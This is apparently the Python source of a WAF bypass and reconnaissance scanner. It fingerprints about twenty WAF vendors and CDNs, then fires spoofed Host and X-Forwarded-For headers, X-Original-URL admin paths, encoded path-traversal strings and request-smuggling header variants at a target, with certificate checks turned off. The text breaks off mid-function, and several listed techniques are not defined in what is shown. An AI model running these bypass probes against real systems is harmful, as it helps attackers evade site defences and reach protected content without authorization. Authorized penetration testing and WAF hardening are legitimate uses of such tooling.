"""
CloudFront WAF Bypass Scanner with Smart Detection and Error Handling
Comprehensive WAF detection, bypass, and reconnaissance toolkit
Optimized for speed and accuracy
"""
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, urlencode, quote, quote_plus
import time
import hashlib
import logging
import socket
import re
from typing import Optional, List, Dict, Any, Tuple, Set
from functools import lru_cache
import threading

# Suppress InsecureRequestWarning for unverified HTTPS requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from .exceptions import (
    BaselineFailedError,
    InvalidTargetError,
    InvalidSchemeError,
    TargetUnreachableError,
    ScanInterruptedError,
    InvalidThreadCountError,
    InvalidDelayError,
    InvalidTimeoutError,
)
from .error_handler import (
    safe_request,
    validate_url,
    GracefulErrorHandler,
    retry_on_network_error,
)


logger = logging.getLogger(__name__)


# WAF Signature Database
WAF_SIGNATURES = {
    'cloudflare': {
        'headers': ['cf-ray', 'cf-cache-status', 'cf-request-id', '__cfduid'],
        'cookies': ['__cfduid', '__cf_bm'],
        'server': ['cloudflare'],
        'body_patterns': ['cloudflare', 'cf-ray', 'attention required', 'cloudflare ray id'],
    },
    'aws_waf': {
        'headers': ['x-amzn-requestid', 'x-amz-cf-id', 'x-amz-cf-pop'],
        'cookies': ['awsalb', 'awsalbcors'],
        'server': ['awselb', 'amazon', 'cloudfront'],
        'body_patterns': ['aws', 'x-amz-', 'request blocked'],
    },
    'akamai': {
        'headers': ['akamai-origin-hop', 'x-akamai-transformed', 'x-akamai-request-id'],
        'cookies': ['akamai_', 'ak_bmsc', 'bm_sv', 'bm_sz'],
        'server': ['akamaighost', 'akamai'],
        'body_patterns': ['akamai', 'access denied', 'reference #'],
    },
    'imperva': {
        'headers': ['x-iinfo', 'x-cdn'],
        'cookies': ['incap_ses_', 'nlbi_', 'visid_incap_'],
        'server': ['imperva', 'incapsula'],
        'body_patterns': ['imperva', 'incapsula', 'incident id', '_incap_'],
    },
    'f5_bigip': {
        'headers': ['x-wa-info'],
        'cookies': ['ts', 'bigipserver', 'f5_cspm', 'f5_st', 'f5avraaaaaaa'],
        'server': ['bigip', 'f5'],
        'body_patterns': ['the requested url was rejected', 'f5 networks', 'bigip'],
    },
    'sucuri': {
        'headers': ['x-sucuri-id', 'x-sucuri-cache'],
        'cookies': ['sucuri_'],
        'server': ['sucuri', 'cloudproxy'],
        'body_patterns': ['sucuri', 'cloudproxy', 'access denied'],
    },
    'modsecurity': {
        'headers': ['x-modsecurity-id'],
        'cookies': [],
        'server': ['modsecurity', 'mod_security'],
        'body_patterns': ['modsecurity', 'mod_security', 'rule id', 'not acceptable'],
    },
    'barracuda': {
        'headers': ['barra_counter_session'],
        'cookies': ['barra_counter_session', 'barracuda_'],
        'server': ['barracuda'],
        'body_patterns': ['barracuda', 'you have been blocked'],
    },
    'fortinet': {
        'headers': ['fortigate', 'fortiwadb'],
        'cookies': ['fgwa', 'fgtauthredirect'],
        'server': ['fortigate', 'fortinet', 'fortiweb'],
        'body_patterns': ['fortinet', 'fortigate', 'web page blocked'],
    },
    'citrix_netscaler': {
        'headers': ['cneonction', 'ns_af'],
        'cookies': ['ns_af', 'citrix_ns_id', 'nsc_'],
        'server': ['netscaler'],
        'body_patterns': ['netscaler', 'citrix', 'ns_af'],
    },
    'radware': {
        'headers': ['x-sl-compstate'],
        'cookies': [],
        'server': ['radware', 'appwall'],
        'body_patterns': ['radware', 'unauthorized activity', 'appwall'],
    },
    'wordfence': {
        'headers': [],
        'cookies': ['wfvt_', 'wordfence_'],
        'server': [],
        'body_patterns': ['wordfence', 'your access to this site has been limited', 'generated by wordfence'],
    },
    'ddos_guard': {
        'headers': ['x-ddos-protection'],
        'cookies': ['__ddg', '__ddgid', '__ddgmark'],
        'server': ['ddos-guard'],
        'body_patterns': ['ddos-guard', 'ddos protection', 'ddos guard'],
    },
    'stackpath': {
        'headers': ['x-sp-waf-nonce', 'x-sp-origin-id'],
        'cookies': [],
        'server': ['stackpath', 'maxcdn'],
        'body_patterns': ['stackpath', 'highwinds', 'maxcdn'],
    },
    'aws_shield': {
        'headers': ['x-amz-cf-id'],
        'cookies': [],
        'server': ['amazon'],
        'body_patterns': ['aws shield', 'request blocked'],
    },
    'azure_front_door': {
        'headers': ['x-azure-ref', 'x-fd-revip'],
        'cookies': [],
        'server': ['azure'],
        'body_patterns': ['azure', 'microsoft', 'access denied'],
    },
    'google_cloud_armor': {
        'headers': ['x-goog-', 'x-cloud-trace-context'],
        'cookies': [],
        'server': ['gws', 'google'],
        'body_patterns': ['google cloud', 'cloud armor', 'denied by security policy'],
    },
    'reblaze': {
        'headers': ['x-rb-', 'rbzid'],
        'cookies': ['rbzid', 'rbz'],
        'server': ['reblaze'],
        'body_patterns': ['reblaze', 'access denied', 'we apologize'],
    },
    'paloalto': {
        'headers': ['x-pan-'],
        'cookies': [],
        'server': ['palo alto'],
        'body_patterns': ['palo alto', 'url filtering', 'block page'],
    },
}

# CDN Signatures
CDN_SIGNATURES = {
    'cloudflare': {
        'headers': ['cf-ray', 'cf-cache-status'],
        'server': ['cloudflare'],
        'cnames': ['cloudflare.com', 'cloudflare-dns.com'],
    },
    'akamai': {
        'headers': ['x-akamai-transformed'],
        'server': ['akamaighost'],
        'cnames': ['akamai.net', 'akamaiedge.net', 'akamaized.net'],
    },
    'cloudfront': {
        'headers': ['x-amz-cf-id', 'x-amz-cf-pop'],
        'server': ['amazon', 'cloudfront'],
        'cnames': ['cloudfront.net', 'amazonaws.com'],
    },
    'fastly': {
        'headers': ['x-served-by', 'x-fastly-request-id'],
        'server': ['fastly'],
        'cnames': ['fastly.net', 'fastlylb.net'],
    },
    'maxcdn': {
        'headers': ['x-maxcdn'],
        'server': ['netdna', 'maxcdn'],
        'cnames': ['netdna.com', 'maxcdn.com'],
    },
    'keycdn': {
        'headers': ['x-pull'],
        'server': ['keycdn'],
        'cnames': ['keycdn.com', 'kxcdn.com'],
    },
    'stackpath': {
        'headers': ['x-sp-origin-id'],
        'server': ['stackpath'],
        'cnames': ['stackpath.com', 'stackpathdns.com'],
    },
    'incapsula': {
        'headers': ['x-iinfo'],
        'server': ['incapsula'],
        'cnames': ['incapdns.net', 'impervadns.net'],
    },
    'sucuri': {
        'headers': ['x-sucuri-id'],
        'server': ['sucuri'],
        'cnames': ['sucuri.net'],
    },
    'azure_cdn': {
        'headers': ['x-azure-ref'],
        'server': ['azure'],
        'cnames': ['azureedge.net', 'azure.net'],
    },
    'google_cdn': {
        'headers': ['x-goog-'],
        'server': ['google', 'gws'],
        'cnames': ['googleusercontent.com', 'googlevideo.com'],
    },
    'bunnycdn': {
        'headers': ['bunny-server-header'],
        'server': ['bunny'],
        'cnames': ['bunny.net', 'b-cdn.net'],
    },
}

# Pre-compile regex patterns for performance
ERROR_PATTERNS = re.compile(
    r'(exception|traceback|stack\s*trace|sql\s*syntax|mysql_|postgresql|ora-\d+|'
    r'internal\s*server\s*error|500\s*internal|debug\s*mode|fatal\s*error|warning:)',
    re.IGNORECASE
)

BACKEND_PATTERNS = re.compile(
    r'(apache|nginx|iis|tomcat|jetty|gunicorn|uwsgi)',
    re.IGNORECASE
)


class CloudFrontBypasser:
    """Optimized WAF Bypass Scanner with connection pooling and smart detection"""
    
    # Class-level session pool for connection reuse
    _session_pool: Dict[str, requests.Session] = {}
    _session_lock = threading.Lock()
    
    def __init__(self, target: str, threads: int = 10, delay: float = 0.2, timeout: int = 5):
        """
        Initialize CloudFront WAF Bypasser
        
        Args:
            target: Target URL to scan
            threads: Number of concurrent threads
            delay: Delay between requests (seconds)
            timeout: Request timeout (seconds)
        
        Raises:
            InvalidTargetError: If target URL is invalid
            InvalidThreadCountError: If threads is not positive
            InvalidDelayError: If delay is negative
            InvalidTimeoutError: If timeout is not positive
        """
        # Validate inputs
        self._validate_inputs(target, threads, delay, timeout)
        
        self.target = target.rstrip('/')
        self.threads = threads
        self.delay = delay
        self.timeout = timeout
        self.results = []
        self._results_lock = threading.Lock()
        
        # Baseline tracking
        self._baseline_size = None
        self._baseline_hash = None
        self._baseline_status = None
        self._baseline_headers = {}
        self._baseline_body_sample = ""
        
        # Response cache to avoid duplicate requests
        self._response_cache: Dict[str, Dict] = {}
        self._cache_lock = threading.Lock()
        
        # Parse target
        try:
            parsed = urlparse(self.target)
            self.domain = parsed.netloc
            self.scheme = parsed.scheme
            
            if not self.domain:
                raise InvalidTargetError(
                    "Invalid target URL: missing domain",
                    details={'target': target}
                )
        except Exception as e:
            raise InvalidTargetError(
                f"Failed to parse target URL: {str(e)}",
                details={'target': target}
            )
        
        # Initialize optimized session with connection pooling
        self._session = self._get_optimized_session()
        
        logger.info(f"Initialized scanner for {self.target}")
    
    def _get_optimized_session(self) -> requests.Session:
        """Create an optimized session with connection pooling and retry logic"""
        session = requests.Session()
        
        # Configure retry strategy
        retry_strategy = Retry(
            total=2,
            backoff_factor=0.3,
            status_forcelist=[500, 502, 503, 504],
        )
        
        # Mount adapters with connection pooling
        adapter = HTTPAdapter(
            pool_connections=self.threads,
            pool_maxsize=self.threads * 2,
            max_retries=retry_strategy
        )
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        
        # Default headers
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        })
        
        # Disable SSL warnings for speed
        session.verify = False
        
        return session
    
    def _validate_inputs(self, target: str, threads: int, delay: float, timeout: int) -> None:
        """Validate all input parameters"""
        # Validate URL
        is_valid, error_msg = validate_url(target)
        if not is_valid:
            raise InvalidTargetError(error_msg, details={'target': target})
        
        # Validate scheme
        parsed = urlparse(target)
        if parsed.scheme not in ['http', 'https']:
            raise InvalidSchemeError(
                f"Invalid scheme '{parsed.scheme}'. Must be http or https",
                details={'target': target, 'scheme': parsed.scheme}
            )
        
        # Validate threads
        if not isinstance(threads, int) or threads <= 0:
            raise InvalidThreadCountError(
                f"Thread count must be positive integer, got: {threads}",
                details={'threads': threads}
            )
        
        # Validate delay
        if not isinstance(delay, (int, float)) or delay < 0:
            raise InvalidDelayError(
                f"Delay must be non-negative number, got: {delay}",
                details={'delay': delay}
            )
        
        # Validate timeout
        if not isinstance(timeout, (int, float)) or timeout <= 0:
            raise InvalidTimeoutError(
                f"Timeout must be positive number, got: {timeout}",
                details={'timeout': timeout}
            )
    
    def scan(self) -> List[Dict[str, Any]]:
        """
        Run all bypass techniques
        
        Returns:
            List of successful bypass results
        
        Raises:
            BaselineFailedError: If baseline cannot be established
            TargetUnreachableError: If target is completely unreachable
            ScanInterruptedError: If scan is interrupted
        """
        logger.info(f"Starting scan of {self.target}")
        print(f"[*] Scanning {self.target}")
        
        # Establish baseline first
        print("[*] Establishing baseline...")
        try:
            baseline = self._get_baseline()
            if not baseline:
                raise BaselineFailedError(
                    "Failed to establish baseline - target may be down",
                    details={'target': self.target}
                )
            
            self._baseline_size = len(baseline.content)
            self._baseline_hash = hashlib.md5(baseline.content).hexdigest()
            self._baseline_status = baseline.status_code
            self._baseline_headers = dict(baseline.headers)
            
            logger.info(
                f"Baseline established: {self._baseline_status} | "
                f"{self._baseline_size} bytes | {self._baseline_hash[:8]}"
            )
            print(f"[+] Baseline: {self._baseline_status} | Size: {self._baseline_size} bytes")
        
        except BaselineFailedError:
            raise
        except TargetUnreachableError:
            raise
        except Exception as e:
            logger.error(f"Unexpected error during baseline: {e}")
            raise BaselineFailedError(
                f"Baseline failed: {str(e)}",
                details={'target': self.target, 'error': str(e)}
            )
        
        print(f"[*] Testing bypass techniques...\n")
        
        # Run WAF Detection first
        print("[*] Phase 1: WAF Detection & Fingerprinting...")
        waf_results = self._detect_waf()
        if waf_results:
            self.results.extend(waf_results)
        
        cdn_results = self._detect_cdn()
        if cdn_results:
            self.results.extend(cdn_results)
        
        print("\n[*] Phase 2: Testing bypass techniques...")
        
        # Define all techniques - organized by category
        techniques = [
            # === Header-Based Bypass Scans ===
            self._test_host_header_injection,
            self._test_x_forwarded_for,
            self._test_x_forwarded_host,
            self._test_x_original_url,
            self._test_header_injection,
            self._test_origin_header_bypass,
            self._test_custom_header_fuzzing,
            
            # === Encoding Bypass Scans ===
            self._test_encoding_bypass,
            self._test_double_encoding,
            self._test_case_manipulation,
            self._test_comment_injection,
            self._test_whitespace_manipulation,
            
            # === HTTP Method & Protocol Scans ===
            self._test_method_bypass,
            self._test_http_method_override,
            self._test_content_type_bypass,
            self._test_http_parameter_pollution,
            
            # === Protocol-Level Scans ===
            self._test_transfer_encoding_smuggling,
            self._test_http2_downgrade,
            self._test_websocket_upgrade,
            self._test_chunked_transfer,
            self._test_http_pipelining,
            
            # === Cache & Control Scans ===
            self._test_cache_control,
            self._test_range_header,
            self._test_cache_poisoning,
            
            # === Payload-Based Bypass Scans ===
            self._test_sqli_bypass,
            self._test_xss_bypass,
            self._test_command_injection_bypass,
            self._test_path_traversal_bypass,
            self._test_ssrf_bypass,
            
            # === Rate Limit & Threshold Testing ===
            self._test_rate_limit_detection,
            
            # === Miscellaneous Scans ===
            self._test_ipv6_bypass,
            self._test_bot_detection_evasion,
            self._test_api_endpoint_discovery,
        ]
        
        # Execute techniques with error handling
        error_count = 0
        try:
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = {executor.submit(technique): technique.__name__ for technique in techniques}
                
                for future in as_completed(futures):
                    technique_name = futures[future]
                    try:
                        result = future.result()
                        if result:
                            self.results.extend(result)
                    except KeyboardInterrupt:
                        logger.warning("Scan interrupted by user")
                        raise ScanInterruptedError("Scan interrupted by user")
                    except Exception as e:
                        error_count += 1
                        logger.error(f"Error in {technique_name}: {e}")
                        # Continue with other techniques
        
        except KeyboardInterrupt:
            logger.warning("Scan interrupted by user")
            raise ScanInterruptedError("Scan interrupted by user")
        
        if error_count > 0:
            logger.warning(f"Scan completed with {error_count} technique errors")
            print(f"\n[!] Warning: {error_count} techniques encountered errors")
        
        logger.info(f"Scan complete: Found {len(self.results)} bypasses")
        return self.results
    
    @retry_on_network_error(max_retries=3, backoff_factor=0.5)
    def _get_baseline(self) -> Optional[requests.Response]:
        """
        Get baseline response for comparison with retry logic
        
        Returns:
            Response object or None
        
        Raises:
            TargetUnreachableError: If target cannot be reached after retries
        """
        try:
            resp = safe_request(
                self.target,
                timeout=self.timeout,
                allow_redirects=False
            )
            return resp
        except Exception as e:
            logger.error(f"Baseline request failed: {e}")
            raise
    
    def _test_request(
        self,
        headers: Optional[dict] = None,
        method: str = 'GET',
        path: str = '/'
    ) -> Optional[Dict[str, Any]]:
        """
        Test a single request configuration with error handling
        
        Args:
            headers: Request headers
            method: HTTP method
            path: URL path
        
        Returns:
            Result dictionary or None if request failed
        """
        url = f"{self.target}{path}"
        
        # Generate cache key for deduplication
        cache_key = f"{method}:{path}:{hash(frozenset((headers or {}).items()))}"
        
        # Check cache first
        with self._cache_lock:
            if cache_key in self._response_cache:
                return self._response_cache[cache_key]
        
        try:
            # Use session for connection pooling
            req_headers = dict(self._session.headers)
            if headers:
                req_headers.update(headers)
            
            resp = self._session.request(
                method=method,
                url=url,
                headers=req_headers,
                timeout=self.timeout,
                allow_redirects=False,
                verify=False
            )
            
            if resp is None:
                return None
            
            # Rate limiting - reduced for speed
            if self.delay > 0:
                time.sleep(self.delay)
            
            # Check if bypass succeeded
            bypass_result = self._is_bypass_fast(resp)
            
            result = {
                'bypass': bypass_result['bypass'],
                'status': resp.status_code,
                'headers': {k: v for k, v in (headers or {}).items() if k != 'X-Technique'},
                'method': method,
                'path': path,
                'size': len(resp.content),
                'technique': headers.get('X-Technique', 'Unknown') if headers else 'Unknown',
                'reason': bypass_result['reason'],
                'severity': bypass_result['severity']
            }
            
            # Cache result
            with self._cache_lock:
                self._response_cache[cache_key] = result
            
            return result
            
        except requests.exceptions.Timeout:
            logger.debug(f"Timeout for {method} {path}")
            return None
        except requests.exceptions.ConnectionError:
            logger.debug(f"Connection error for {method} {path}")
            return None
        except Exception as e:
            logger.debug(f"Request failed for {method} {path}: {e}")
            return None
    
    def _is_bypass_fast(self, response: requests.Response) -> Dict[str, Any]:
        """Optimized bypass detection with pre-compiled patterns"""
        
        if self._baseline_size is None:
            return {'bypass': False, 'reason': 'No baseline', 'severity': 'INFO'}
        
        status = response.status_code
        
        # Quick rejection: error responses are NOT bypasses
        if status >= 400:
            return {'bypass': False, 'reason': f'Blocked: {status}', 'severity': 'INFO'}
        
        try:
            content = response.content
            current_size = len(content)
            
            # CRITICAL: Status code changed from blocked to allowed
            if self._baseline_status in [403, 401, 429] and status == 200:
                return {
                    'bypass': True,
                    'reason': f'Auth bypass: {self._baseline_status} → {status}',
                    'severity': 'CRITICAL'
                }
            
            # Quick size comparison
            if self._baseline_size > 0:
                size_diff = abs(current_size - self._baseline_size)
                size_diff_percent = (size_diff / self._baseline_size) * 100
                
                # HIGH: Significant size difference (>15% change)
                if size_diff_percent > 15 and size_diff > 200:
                    return {
                        'bypass': True,
                        'reason': f'Content diff: {size_diff_percent:.0f}% change',
                        'severity': 'HIGH'
                    }
            
            # Only compute hash if size is similar (optimization)
            if abs(current_size - self._baseline_size) < 500:
                current_hash = hashlib.md5(content).hexdigest()
                if current_hash != self._baseline_hash:
                    return {
                        'bypass': True,
                        'reason': 'Different content (hash mismatch)',
                        'severity': 'HIGH'
                    }
            
            # Check response body for error indicators (first 3KB only for speed)
            body_sample = response.text[:3000].lower() if current_size > 0 else ""
            
            # Use pre-compiled regex for speed
            if ERROR_PATTERNS.search(body_sample):
                match = ERROR_PATTERNS.search(body_sample)
                return {
                    'bypass': True,
                    'reason': f'Backend exposed: {match.group(1)}',
                    'severity': 'CRITICAL' if 'sql' in match.group(1).lower() or 'exception' in match.group(1).lower() else 'HIGH'
                }
            
            # Check headers (fast dict lookups)
            resp_headers_lower = {k.lower(): v for k, v in response.headers.items()}
            
            # Backend server header exposed
            server = resp_headers_lower.get('server', '').lower()
            if server and BACKEND_PATTERNS.search(server):
                baseline_server = self._baseline_headers.get('server', '').lower()
                if not BACKEND_PATTERNS.search(baseline_server):
                    return {
                        'bypass': True,
                        'reason': f'Backend server: {response.headers.get("server")}',
                        'severity': 'MEDIUM'
                    }
            
            # X-Powered-By exposed
            if 'x-powered-by' in resp_headers_lower and 'x-powered-by' not in self._baseline_headers:
                return {
                    'bypass': True,
                    'reason': f'Tech exposed: {resp_headers_lower["x-powered-by"]}',
                    'severity': 'MEDIUM'
                }
            
            return {'bypass': False, 'reason': 'No bypass detected', 'severity': 'INFO'}
            
        except Exception as e:
            logger.debug(f"Bypass detection error: {e}")
            return {'bypass': False, 'reason': 'Detection error', 'severity': 'INFO'}
    
    def _is_bypass(self, response: requests.Response) -> Dict[str, Any]:
        """Determine if response indicates WAF bypass with detailed reasoning"""
        
        if self._baseline_size is None:
            return {'bypass': False, 'reason': 'No baseline', 'severity': 'INFO'}
        
        # Ignore error responses (4xx, 5xx) - these are NOT bypasses
        if response.status_code >= 400:
            return {'bypass': False, 'reason': f'Blocked: {response.status_code}', 'severity': 'INFO'}
        
        try:
            current_size = len(response.content)
            current_hash = hashlib.md5(response.content).hexdigest()
            size_diff = abs(current_size - self._baseline_size)
            size_diff_percent = (size_diff / self._baseline_size) * 100 if self._baseline_size > 0 else 0
            
            # CRITICAL: Status code changed from blocked to allowed
            if self._baseline_status in [403, 401] and response.status_code == 200:
                return {
                    'bypass': True,
                    'reason': f'Authentication bypass: {self._baseline_status} → {response.status_code}',
                    'severity': 'CRITICAL'
                }
            
            # HIGH: Significant size difference (different content)
            if size_diff_percent > 10:
                return {
                    'bypass': True,
                    'reason': f'Content difference: {size_diff} bytes ({size_diff_percent:.1f}% change)',
                    'severity': 'HIGH'
                }
            
            # HIGH: Different content hash (even if size similar)
            if current_hash != self._baseline_hash and size_diff > 100:
                return {
                    'bypass': True,
                    'reason': 'Different content returned (hash mismatch)',
                    'severity': 'HIGH'
                }
            
            # CRITICAL: Backend error exposed - use pre-compiled regex
            body_lower = response.text[:5000].lower()
            match = ERROR_PATTERNS.search(body_lower)
            if match:
                severity = 'CRITICAL' if match.group(1) in ['exception', 'traceback', 'sql syntax', 'mysql_', 'postgresql'] else 'HIGH'
                return {
                    'bypass': True,
                    'reason': f'Backend exposed: "{match.group(1)}" found',
                    'severity': severity
                }
            
            # MEDIUM: Backend server header exposed
            if 'server' in response.headers:
                server = response.headers['server'].lower()
                if BACKEND_PATTERNS.search(server):
                    baseline_server = self._baseline_headers.get('server', '').lower()
                    if not BACKEND_PATTERNS.search(baseline_server):
                        return {
                            'bypass': True,
                            'reason': f'Backend server exposed: {response.headers["server"]}',
                            'severity': 'MEDIUM'
                        }
            
            # MEDIUM: X-Powered-By header exposed
            if 'x-powered-by' in response.headers:
                if 'x-powered-by' not in self._baseline_headers:
                    return {
                        'bypass': True,
                        'reason': f'Backend tech exposed: {response.headers["x-powered-by"]}',
                        'severity': 'MEDIUM'
                    }
            
            # MEDIUM: Different redirect location
            if response.status_code in [301, 302, 307, 308]:
                baseline_location = self._baseline_headers.get('location', '')
                current_location = response.headers.get('location', '')
                if current_location and current_location != baseline_location:
                    return {
                        'bypass': True,
                        'reason': f'Different redirect: {current_location}',
                        'severity': 'MEDIUM'
                    }
            
            # No bypass detected
            return {'bypass': False, 'reason': 'Response identical to baseline', 'severity': 'INFO'}
        
        except Exception as e:
            logger.error(f"Error in bypass detection: {e}")
            return {'bypass': False, 'reason': f'Detection error: {str(e)}', 'severity': 'INFO'}
    
    def _batch_test(self, test_cases: List[Dict], method: str = 'GET', verbose: bool = True) -> List[Dict[str, Any]]:
        """
        Optimized batch testing - run multiple tests in parallel
        
        Args:
            test_cases: List of dicts with 'headers', 'path', and optional 'technique' keys
            method: HTTP method to use
            verbose: Whether to print bypass results
        
        Returns:
            List of bypass results
        """
        results = []
        
        def run_single_test(test_case):
            headers = test_case.get('headers', {}).copy()
            path = test_case.get('path', '/')
            technique = test_case.get('technique', headers.get('X-Technique', 'Unknown'))
            
            if 'X-Technique' not in headers:
                headers['X-Technique'] = technique
            
            return self._test_request(headers, method=method, path=path)
        
        # Use thread pool for parallel execution within batch
        with ThreadPoolExecutor(max_workers=min(len(test_cases), self.threads)) as executor:
            futures = {executor.submit(run_single_test, tc): tc for tc in test_cases}
            
            for future in as_completed(futures):
                try:
                    result = future.result()
                    if result and result['bypass']:
                        results.append(result)
                        if verbose:
                            print(f"  [✓] BYPASS: {result['technique']} | {result['reason']} | {result['severity']}")
                except Exception as e:
                    logger.debug(f"Batch test error: {e}")
        
        return results

    def _test_host_header_injection(self) -> List[Dict[str, Any]]:
        """Test Host header manipulation - optimized batch"""
        test_cases = [
            {'headers': {'Host': 'localhost'}, 'technique': 'Host: localhost'},
            {'headers': {'Host': '127.0.0.1'}, 'technique': 'Host: 127.0.0.1'},
            {'headers': {'Host': f'{self.domain}:80'}, 'technique': f'Host: {self.domain}:80'},
            {'headers': {'Host': f'{self.domain}:443'}, 'technique': f'Host: {self.domain}:443'},
        ]
        return self._batch_test(test_cases)
    
    def _test_x_forwarded_for(self) -> List[Dict[str, Any]]:
        """Test X-Forwarded-For bypass - optimized batch"""
        ips = ['127.0.0.1', '10.0.0.1', '192.168.1.1', '169.254.169.254']
        test_cases = [
            {'headers': {'X-Forwarded-For': ip}, 'technique': f'X-Forwarded-For: {ip}'}
            for ip in ips
        ]
        return self._batch_test(test_cases)
    
    def _test_x_forwarded_host(self) -> List[Dict[str, Any]]:
        """Test X-Forwarded-Host bypass - optimized batch"""
        hosts = ['localhost', '127.0.0.1', self.domain]
        test_cases = [
            {'headers': {'X-Forwarded-Host': host}, 'technique': f'X-Forwarded-Host: {host}'}
            for host in hosts
        ]
        return self._batch_test(test_cases)
    
    def _test_x_original_url(self) -> List[Dict[str, Any]]:
        """Test X-Original-URL bypass - optimized batch"""
        paths = ['/', '/admin', '/%2e%2e/', '/..;/']
        test_cases = [
            {'headers': {'X-Original-URL': path}, 'technique': f'X-Original-URL: {path}'}
            for path in paths
        ]
        return self._batch_test(test_cases)
    
    def _test_cache_control(self) -> List[Dict[str, Any]]:
        """Test Cache-Control bypass - optimized batch"""
        test_cases = [
            {'headers': {'Cache-Control': 'no-cache'}, 'technique': 'Cache-Control: no-cache'},
            {'headers': {'Cache-Control': 'no-store'}, 'technique': 'Cache-Control: no-store'},
            {'headers': {'Pragma': 'no-cache'}, 'technique': 'Pragma: no-cache'},
        ]
        return self._batch_test(test_cases)
    
    def _test_encoding_bypass(self) -> List[Dict[str, Any]]:
        """Test encoding bypass - optimized batch"""
        paths = ['/%2e/', '/..%2f', '/%252e%252e/']
        test_cases = [
            {'headers': {}, 'path': path, 'technique': f'Path Encoding: {path}'}
            for path in paths
        ]
        return self._batch_test(test_cases)
    
    def _test_method_bypass(self) -> List[Dict[str, Any]]:
        """Test HTTP method bypass"""
        results = []
        methods = ['POST', 'OPTIONS', 'PUT', 'DELETE']
        
        for method in methods:
            result = self._test_request({'X-Technique': f'Method: {method}'}, method=method)
            if result and result['bypass']:
                results.append(result)
                print(f"  [✓] BYPASS: {result['technique']} | {result['reason']} | {result['severity']}")
        
        return results
    
    def _test_content_type_bypass(self) -> List[Dict[str, Any]]:
        """Test Content-Type bypass - optimized batch"""
        content_types = ['application/json', 'application/xml', 'text/plain', 'multipart/form-data']
        test_cases = [
            {'headers': {'Content-Type': ct}, 'method': 'POST', 'technique': f'Content-Type: {ct}'}
            for ct in content_types
        ]
        return self._batch_test(test_cases)
    
    def _test_transfer_encoding_smuggling(self) -> List[Dict[str, Any]]:
        """Test Transfer-Encoding smuggling bypass - optimized batch"""
        test_cases = [
            {'headers': {'Transfer-Encoding': 'chunked'}, 'method': 'POST', 'technique': 'Transfer-Encoding: chunked'},
            {'headers': {'Transfer-Encoding': ' chunked'}, 'method': 'POST', 'technique': 'Transfer-Encoding: [space]chunked'},
            {'headers': {'Transfer-Encoding': 'ChUnKeD'}, 'method': 'POST', 'technique': 'Transfer-Encoding: ChUnKeD'},
            {'headers': {'Transfer-Encoding': 'chunked', 'Content-Length': '0'}, 'method': 'POST', 'technique': 'CL.TE Smuggling'},
        ]
        return self._batch_test(test_cases)
    
    def _test_http2_downgrade(self) -> List[Dict[str, Any]]:
        """Test HTTP/2 to HTTP/1.1 downgrade bypass - optimized batch"""
        test_cases = [
            {'headers': {'Connection': 'HTTP2-Settings', 'Upgrade': 'h2c'}, 'technique': 'HTTP/2 Downgrade: h2c'},
            {'headers': {'Connection': 'Upgrade', 'Upgrade': 'HTTP/2.0'}, 'technique': 'HTTP/2 Downgrade: HTTP/2.0'},
            {'headers': {'Connection': 'close'}, 'technique': 'HTTP/1.0 Fallback'},
        ]
        return self._batch_test(test_cases)
    
    def _test_websocket_upgrade(self) -> List[Dict[str, Any]]:
        """Test WebSocket upgrade bypass - optimized batch"""
        test_cases = [
            {'headers': {'Upgrade': 'websocket', 'Connection': 'Upgrade', 'Sec-WebSocket-Key': 'dGhlIHNhbXBsZSBub25jZQ==', 'Sec-WebSocket-Version': '13'}, 'technique': 'WebSocket Upgrade (Standard)'},
            {'headers': {'upgrade': 'WebSocket', 'connection': 'upgrade'}, 'technique': 'WebSocket Upgrade (Case Variation)'},
        ]
        return self._batch_test(test_cases)
    
    def _test_range_header(self) -> List[Dict[str, Any]]:
        """Test Range header bypass - optimized batch"""
        test_cases = [
            {'headers': {'Range': 'bytes=0-1024'}, 'technique': 'Range: bytes=0-1024'},
            {'headers': {'Range': 'bytes=0-0'}, 'technique': 'Range: Single Byte'},
            {'headers': {'Range': 'bytes=-500'}, 'technique': 'Range: Last 500 Bytes'},
        ]
        return self._batch_test(test_cases)
    
    def _test_double_encoding(self) -> List[Dict[str, Any]]:
        """Test double/triple encoding bypass - optimized batch"""
        test_cases = [
            {'headers': {}, 'path': '/%252e%252e/', 'technique': 'Double Encoded: ../'},
            {'headers': {}, 'path': '/%25252e%25252e%25252f', 'technique': 'Triple Encoded: ../'},
            {'headers': {}, 'path': '/%u002e%u002e%u002f', 'technique': 'Unicode Encoded: ../'},
        ]
        return self._batch_test(test_cases)

    # ============================================================================
    # WAF DETECTION & FINGERPRINTING
    # ============================================================================
    
    def _detect_waf(self) -> List[Dict[str, Any]]:
        """Detect WAF vendor and version"""
        results = []
        print("  [*] Detecting WAF vendor...")
        
        try:
            # Make baseline request for WAF detection
            resp = safe_request(self.target, timeout=self.timeout, allow_redirects=True)
            if not resp:
                return results
            
            headers_lower = {k.lower(): v.lower() for k, v in resp.headers.items()}
            cookies_str = str(resp.cookies.get_dict()).lower()
            server_header = headers_lower.get('server', '').lower()
            body_lower = resp.text.lower()[:5000]  # Check first 5KB
            
            detected_wafs = []
            
            for waf_name, signatures in WAF_SIGNATURES.items():
                confidence = 0
                matched_indicators = []
                
                # Check headers
                for sig_header in signatures.get('headers', []):
                    if sig_header.lower() in headers_lower:
                        confidence += 30
                        matched_indicators.append(f"Header: {sig_header}")
                
                # Check cookies
                for sig_cookie in signatures.get('cookies', []):
                    if sig_cookie.lower() in cookies_str:
                        confidence += 25
                        matched_indicators.append(f"Cookie: {sig_cookie}")
                
                # Check server header
                for sig_server in signatures.get('server', []):
                    if sig_server.lower() in server_header:
                        confidence += 35
                        matched_indicators.append(f"Server: {sig_server}")
                
                # Check body patterns
                for pattern in signatures.get('body_patterns', []):
                    if pattern.lower() in body_lower:
                        confidence += 20
                        matched_indicators.append(f"Body: {pattern}")
                
                if confidence > 0:
                    detected_wafs.append({
